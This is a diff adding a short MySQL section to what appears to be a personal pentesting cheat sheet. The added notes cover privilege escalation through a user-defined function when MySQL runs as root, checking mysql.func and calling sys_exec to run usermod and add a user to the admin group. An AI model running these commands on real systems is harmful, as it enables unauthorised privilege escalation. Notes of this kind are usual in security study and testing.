@@ -1391,6 +1391,16 @@ bash/zsh + linux terminal cli tools commands
         - download bucket: aws s3 sync s3://my-bucket-0 . --region ap-east-1 
 
 ---------------------------------------------------------------------
+mysql
+---------------------------------------------------------------------
+- exploit through UDF (mysql running in root)
+  - if UDF is available
+    - check: select * from mysql.func;
+      - locate udf
+  - privilege escalation:
+    - sys_exec('usermod -a -G admin john');
+
+---------------------------------------------------------------------
 sql injection
 ---------------------------------------------------------------------
 - login bypass
